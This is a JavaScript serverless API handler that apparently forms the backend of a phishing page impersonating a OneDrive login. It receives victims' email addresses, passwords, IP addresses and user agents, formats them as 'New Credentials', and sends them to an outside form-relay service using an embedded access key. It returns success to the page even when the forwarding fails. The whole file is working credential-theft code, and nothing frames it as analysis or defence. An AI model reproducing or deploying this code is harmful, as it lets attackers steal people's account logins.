// api/collect.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { email, password, ip, userAgent } = req.body;

    const message = `
🔐 New Credentials
📧 Email: ${email || 'N/A'}
🔑 Password: ${password || 'N/A'}
🌐 IP: ${ip || 'Unknown'}
📱 User-Agent: ${userAgent || 'N/A'}
⏰ Time: ${new Date().toISOString()}
    `;

    const response = await fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
      },
      body: JSON.stringify({
        access_key: 'a682d4f0-f5ae-4c34-a6f6-f29d10f9c24b',
        subject: 'New Login',
        from_name: 'OneDrive Portal',
        email: email || 'No email',
        password: password || 'No password',
        ip: ip || 'Unknown',
        userAgent: userAgent || 'Unknown',
        message: message.trim(),
      }),
    });

    const data = await response.json();
    console.log('Web3Forms response:', response.status, JSON.stringify(data));

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error in collect handler:', error);
    return res.status(200).json({ success: true });
  }
}